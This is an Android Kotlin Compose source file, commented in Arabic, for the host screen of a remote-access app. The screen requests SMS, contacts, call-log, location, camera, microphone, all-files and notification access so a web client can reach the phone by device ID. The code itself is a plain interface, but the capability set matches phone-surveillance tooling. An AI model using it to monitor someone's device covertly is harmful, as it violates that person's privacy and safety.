package com.remotebridge.ui.screens.host

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.animation.core.spring
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.BatteryChargingFull
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.Cameraswitch
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Folder
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.MicOff
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.filled.Videocam
import androidx.compose.material.icons.filled.VideocamOff
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.FilledTonalButton
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.lifecycle.viewmodel.compose.viewModel
import com.rbstudio.R
import com.remotebridge.host.service.HostForegroundService
import com.remotebridge.ui.viewmodel.HostViewModel

/**
 * شاشة الجهاز المضيف: إدارة خدمة المضيف، الأذونات الكاملة، وبث الكاميرا والميكروفون.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun HostScreen(
    onBack: () -> Unit,
    onSettingsClick: () -> Unit,
    viewModel: HostViewModel = viewModel(factory = HostViewModel.Factory)
) {
    val context = LocalContext.current
    val isRunning by viewModel.serviceRunning.collectAsState()
    val serverUrl by viewModel.serverUrl.collectAsState()
    val stunServer by viewModel.stunServer.collectAsState()
    val connectionProfile by viewModel.connectionProfile.collectAsState()
    val deviceName by viewModel.deviceName.collectAsState()
    val deviceId by viewModel.deviceId.collectAsState()
    val cameraState by viewModel.cameraState.collectAsState()

    var permissionTick by remember { mutableStateOf(0) }

    // طالب الأذونات العامة
    val dataPermissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        permissionTick++
    }

    // طالب أذونات الكاميرا والميكروفون
    val cameraMicLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        permissionTick++
    }

    // 📍 طالب إذن الموقع (لتتبع سجل الفيولي والخريطة الحية)
    val locationLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        permissionTick++
    }

    // 🔁 إعادة فحص الأذونات فور العودة إلى الواجهة (من إعدادات النظام: البطارية/الملفات/الإشعارات)
    // حتى تظهر تأكيدات المنح الخضراء مباشرة بعد منح الأذونات من المستخدم.
    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                permissionTick++
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    val generalPermissions = arrayOf(
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.POST_NOTIFICATIONS
    )

    val cameraMicPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )

    fun hasPermission(perm: String): Boolean =
        ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED

    val hasDataPerms = hasPermission(Manifest.permission.READ_CONTACTS) &&
            hasPermission(Manifest.permission.READ_SMS)
    val hasCameraPerm = hasPermission(Manifest.permission.CAMERA)
    val hasMicPerm = hasPermission(Manifest.permission.RECORD_AUDIO)
    // 📍 إذن الموقع (يتيح تتبع سجل مواقع الهاتف المضيف على الخريطة)
    val hasLocationPerm = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) ||
            hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
    val hasAllFiles = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        Environment.isExternalStorageManager()
    } else {
        hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
    }
    // 🔔 الوصول للإشعارات: فحص حقيقي لحالة مستمع الإشعارات بدل القيم الثابتة
    val hasNotificationListener = NotificationManagerCompat
        .getEnabledListenerPackages(context)
        .contains(context.packageName)

    val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
    val isIgnoringBattery = powerManager?.isIgnoringBatteryOptimizations(context.packageName) == true

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text(stringResource(R.string.host_title)) },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(
                            imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                            contentDescription = null
                        )
                    }
                }
            )
        }
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 20.dp, vertical = 12.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // بطاقة حالة المضيف والمعرف المستهدف
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = if (isRunning)
                        MaterialTheme.colorScheme.primaryContainer
                    else MaterialTheme.colorScheme.surfaceVariant
                )
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(20.dp),
                    verticalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    Text(
                        text = if (isRunning)
                            stringResource(R.string.host_running)
                        else stringResource(R.string.host_stopped),
                        style = MaterialTheme.typography.titleLarge,
                        fontWeight = FontWeight.Bold
                    )

                    if (deviceId.isNotBlank()) {
                        Card(
                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface.copy(alpha = 0.8f)),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(
                                modifier = Modifier.padding(12.dp),
                                verticalArrangement = Arrangement.spacedBy(4.dp)
                            ) {
                                Text(
                                    text = "رمز ومعرّف هذا الجهاز المضيف (Device ID):",
                                    style = MaterialTheme.typography.labelSmall,
                                    fontWeight = FontWeight.Bold,
                                    color = MaterialTheme.colorScheme.primary
                                )
                                Text(
                                    text = deviceId,
                                    style = MaterialTheme.typography.bodyMedium.copy(fontWeight = FontWeight.Bold),
                                    color = MaterialTheme.colorScheme.onSurface
                                )
                                Text(
                                    text = "💡 اكتب هذا المعرّف في واجهة الويب في مربع 'المعرف المستهدف' (Target ID) للاتصال المباشر بهذه الكاميرا والبيانات.",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                            }
                        }
                    }

                    Text(
                        text = "🌐 خادم الإشارات (Signaling): ${serverUrl.ifBlank { "wss://remotebridge1.onrender.com/ws" }}",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )

                    Text(
                        text = "⚡ خادم WebRTC STUN المعتمد: ${stunServer.ifBlank { "stun:stun.l.google.com:19302" }}",
                        style = MaterialTheme.typography.bodySmall,
                        fontWeight = FontWeight.Medium,
                        color = MaterialTheme.colorScheme.tertiary
                    )

                    Text(
                        text = "🔗 نمط وبروفايل نقل البيانات: ${when (connectionProfile) {
                            "RENDER_ONLY" -> "خادم Render فقط"
                            "FLY_ONLY" -> "خادم Fly.io فقط"
                            "LOCAL_LAN" -> "شبكة محلية LAN فقط"
                            else -> "هجين متكامل (WebRTC P2P + Cloud)"
                        }}",
                        style = MaterialTheme.typography.bodySmall,
                        fontWeight = FontWeight.Bold,
                        color = MaterialTheme.colorScheme.primary
                    )
                }
            }

            // أزرار بدء/إيقاف الخدمة
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Button(
                    onClick = { viewModel.startHost() },
                    enabled = !isRunning,
                    modifier = Modifier.weight(1f)
                ) {
                    Icon(
                        imageVector = Icons.Default.PlayArrow,
                        contentDescription = null,
                        modifier = Modifier.size(20.dp)
                    )
                    Spacer(modifier = Modifier.size(8.dp))
                    Text(stringResource(R.string.start_host))
                }

                Button(
                    onClick = { viewModel.stopHost() },
                    enabled = isRunning,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.error
                    ),
                    modifier = Modifier.weight(1f)
                ) {
                    Icon(
                        imageVector = Icons.Default.Stop,
                        contentDescription = null,
                        modifier = Modifier.size(20.dp)
                    )
                    Spacer(modifier = Modifier.size(8.dp))
                    Text(stringResource(R.string.stop_host))
                }
            }

            // ⚠️ نتيجة النقر ظاهرة دائماً: تحذير حي يُحدَّث تلقائياً بالأذونات الناقصة
            // (يختفي فور اكتمال المنح) حتى لو كانت الخدمة تعمل فعلاً.
            val missingNow = remember(permissionTick) {
                HostForegroundService.getMissingPermissions(context)
            }
            if (missingNow.isNotEmpty()) {
                Card(
                    colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.errorContainer
                    ),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "⚠️ تنبيه: لا تزال هناك ${missingNow.size} أذونات غير ممنوحة: ${missingNow.joinToString("، ", limit = 4) { finePermShortLabel(it) }}${if (missingNow.size > 4) " وغيرها" else ""}.\nاضغط «${stringResource(R.string.start_host)}» لنبدأ المضيف على أي حال، واسمح بالمتبقي من بطاقات الصلاحيات أدناه لتعمل جميع الميزات.",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onErrorContainer,
                        modifier = Modifier.padding(12.dp)
                    )
                }
            }

            // 🛡️ B4 — ملخص مضغوط لحالة الأذونات (البطاقات الكاملة والمعالج منتقلان إلى الإعدادات)
            val hasSomeMissing = missingNow.isNotEmpty()
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = if (hasSomeMissing)
                        MaterialTheme.colorScheme.surfaceVariant
                    else MaterialTheme.colorScheme.primaryContainer
                )
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(14.dp),
                    verticalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Text(
                        text = if (hasSomeMissing)
                            "🛡️ الأذونات: ${missingNow.size} غير ممنوحة — معالج الأذونات الكامل صار في الإعدادات"
                        else "🛡️ جميع الأذونات ممنوحة ✓ — المعالج الكامل في الإعدادات",
                        style = MaterialTheme.typography.bodySmall,
                        fontWeight = FontWeight.Bold,
                        color = if (hasSomeMissing) MaterialTheme.colorScheme.onSurfaceVariant
                        else MaterialTheme.colorScheme.onPrimaryContainer
                    )
                    if (hasSomeMissing) {
                        Text(
                            text = missingNow.joinToString("، ", limit = 4) { finePermShortLabel(it) } +
                                    (if (missingNow.size > 4) " وغيرها" else ""),
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(8.dp))

            OutlinedButton(
                onClick = onSettingsClick,
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(stringResource(R.string.settings))
            }
        }
    }
}

/**
 * تسمية عربية مختصرة لاسم الإذن لعرضها في تحذير الأذونات الناقصة.
 */
private fun finePermShortLabel(perm: String): String = when (perm) {
    Manifest.permission.CAMERA -> "الكاميرا"
    Manifest.permission.RECORD_AUDIO -> "الميكروفون"
    Manifest.permission.ACCESS_FINE_LOCATION -> "الموقع الدقيق"
    Manifest.permission.READ_SMS -> "قراءة الرسائل"
    Manifest.permission.RECEIVE_SMS -> "استقبال الرسائل"
    Manifest.permission.READ_CONTACTS -> "جهات الاتصال"
    Manifest.permission.READ_CALL_LOG -> "سجل المكالمات"
    Manifest.permission.READ_PHONE_STATE -> "حالة الهاتف"
    Manifest.permission.READ_MEDIA_IMAGES -> "الصور"
    Manifest.permission.READ_MEDIA_VIDEO -> "الفيديو"
    Manifest.permission.READ_MEDIA_AUDIO -> "الملفات الصوتية"
    Manifest.permission.READ_EXTERNAL_STORAGE -> "الملفات"
    Manifest.permission.POST_NOTIFICATIONS -> "الإشعارات"
    else -> perm.substringAfterLast('.')
}
